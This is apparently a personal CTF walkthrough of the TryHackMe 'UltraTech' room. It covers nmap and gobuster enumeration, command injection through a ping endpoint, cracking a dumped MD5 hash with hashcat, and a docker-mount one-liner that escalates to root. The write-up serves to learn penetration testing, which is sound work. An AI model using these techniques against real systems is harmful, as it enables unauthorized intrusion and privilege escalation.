---
title: UltraTech
date: 2022-12-17 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [security, pentest, enumeration, web]
---

<https://tryhackme.com/room/ultratech1> The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

# Notes

Given some inspiration, and if we get stuck keep enumerating because I for sure will miss something.

> You have been contracted by UltraTech to pentest their infrastructure.
> It is a grey-box kind of assessment, the only information you have
> is the company's name and their server's IP address.

* * * 

- `sudo nmap -p- ultratech.thm -vvv -T 4`
- `sudo nmap -sC -sV -sT -O -p21,22,31331,8081 ultratech.thm`

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc668985e705c2a5da7f01203a13fc27 (RSA)
|   256 c367dd26fa0c5692f35ba0b38d6d20ab (ECDSA)
|_  256 119b5ad6ff2fe449d2b517360e2f1d2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 5.4 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
```

perform some gobuster scans on the open servers

during the gobuster scan 8081 we find 2 routes auth and ping the 31331 doesnt yeild much results.

```
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
/Ping                 (Status: 500) [Size: 1094]
/Auth                 (Status: 200) [Size: 39]
```

found a login page at `/partners.html` on 31331 that was refrenced in the sitemap.txt but not linked to in the website.

this form sends a GET request to /ping?ip=ultratech.thm

which sends a GET request to /auth?login=admin&password=pass on :8081

then sends another request back to /ping

capturing the request in burpsuite and sending to the repearing the ping is actually executing ping on the machine, maybe we can do something with this.

trying many requests finally using tilda apostrophe thing manage to get the response of the sqlite db utech.db.sqlite

using cat we can get r00t hash f357a0c52799563c7c7b76c1e7543a32 and crack.

- `hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/seclists/Passwords/rockyou.txt`

r00t:n100906

we can login via ssh

checking id shows us we are in a docker container, maybe we can escape. 

we can list available docker images with `docker ps -a`, then escape with `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

as root we can access our final flag which is the first 9 chars of the root's private ssh key which is located in `/root/.ssh/`